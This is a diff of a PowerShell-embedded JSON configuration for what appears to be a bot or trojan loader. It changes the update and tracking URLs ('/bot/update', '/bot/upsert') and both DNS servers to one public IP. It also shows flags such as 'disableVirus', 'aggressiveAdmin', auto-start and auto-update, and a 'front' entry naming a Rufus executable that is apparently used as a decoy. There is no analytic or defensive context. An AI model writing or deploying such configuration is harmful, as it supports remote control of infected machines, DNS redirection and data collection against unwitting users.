@@ -1,19 +1,19 @@
 
 $server = @'
 {
-  "version": "2026.04.20 10:16:40",
+  "version": "2026.06.13 16:21:42",
   "urlDoc": "",
   "disabled": false,
   "disableVirus": false,
-  "serverIp": "192.168.0.86",
+  "serverIp": "26.188.115.1",
   "server": "default",
-  "primaryDns": "79.133.57.170",
-  "secondaryDns": "79.133.57.170",
+  "primaryDns": "26.188.115.1",
+  "secondaryDns": "26.188.115.1",
   "extraUpdate": false,
-  "updateUrl": "http://192.168.0.86/bot/update",
+  "updateUrl": "http://26.188.115.1/bot/update",
   "track": true,
   "trackDesktop": false,
-  "trackUrl": "http://192.168.0.86/bot/upsert",
+  "trackUrl": "http://26.188.115.1/bot/upsert",
   "autoStart": true,
   "autoUpdate": true,
   "aggressiveAdmin": true,
@@ -26,13 +26,11 @@ $server = @'
   "startDownloads": [],
   "startDownloadsBackForce": true,
   "startDownloadsBack": [],
-  "startUrlsForce": true,
+  "startUrlsForce": false,
   "startUrls": [],
-  "frontForce": true,
-  "front": [
-    "rufus-4.13.exe"
-  ],
-  "embeddingsForce": true,
+  "frontForce": false,
+  "front": [],
+  "embeddingsForce": false,
   "embeddings": []
 }
 '@ | ConvertFrom-Json
